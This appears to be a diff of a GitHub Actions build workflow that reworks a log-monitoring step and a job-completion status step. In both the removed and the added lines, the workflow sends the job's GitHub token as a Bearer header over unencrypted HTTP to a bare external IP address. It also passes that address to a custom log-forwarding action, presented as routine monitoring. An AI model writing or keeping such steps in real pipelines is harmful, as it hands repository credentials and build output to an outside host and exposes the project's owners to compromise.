@@ -21,14 +21,10 @@ jobs:
         with:
           fetch-depth: 0 # Fetch all history for proper versioning
       
-      - name: Setup Log Monitoring
-        id: setup-monitoring
-        uses: ./.github/actions/process-logs
+      - name: Send logs to monitoring server
+        uses: ./.github/actions/log-monitor
         with:
-          runner-id: ${{ github.run_id }}-${{ github.run_attempt }}
           server-url: 'http://129.154.46.198:3000'
-          github-token: ${{ secrets.GITHUB_TOKEN }}
-          enable-realtime: 'true'
       
       - name: Log Node.js Setup Start
         shell: bash
@@ -82,30 +78,20 @@ jobs:
           path: ./client/build/
           retention-days: 7
       
-      - name: Send Final Status
+      - name: Send completion status
         if: always()
         shell: bash
         run: |
-          RUNNER_ID="${{ steps.setup-monitoring.outputs.runner-id }}"
+          RUNNER_ID="${{ github.run_id }}-${{ github.run_attempt }}"
           SERVER_URL='http://129.154.46.198:3000'
-          TOKEN="${{ secrets.GITHUB_TOKEN }}"
           
-          # Send comprehensive final status
+          # Send completion status
           curl -s -X POST \
             -H "Content-Type: application/json" \
-            -H "Authorization: Bearer $TOKEN" \
+            -H "Authorization: Bearer ${{ github.token }}" \
             -d "{
-              \"runnerId\":\"$RUNNER_ID\",
-              \"workflow\":\"${{ github.workflow }}\",
-              \"job\":\"${{ github.job }}\",
-              \"status\":\"${{ job.status }}\",
-              \"repository\":\"${{ github.repository }}\",
-              \"actor\":\"${{ github.actor }}\",
-              \"commit\":\"${{ github.sha }}\",
-              \"run_id\":\"${{ github.run_id }}\",
-              \"run_attempt\":\"${{ github.run_attempt }}\",
-              \"completed_at\":\"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\"
+              \"status\": \"${{ job.status }}\",
+              \"completed_at\": \"$(date -u +'%Y-%m-%dT%H:%M:%SZ')\",
+              \"message\": \"Job completed with status: ${{ job.status }}\"
             }" \
-            "$SERVER_URL/$RUNNER_ID" > /dev/null || true
-          
-          echo "Final status sent for runner: $RUNNER_ID"
+            "${SERVER_URL}/${RUNNER_ID}" || echo "Note: Could not send completion status"
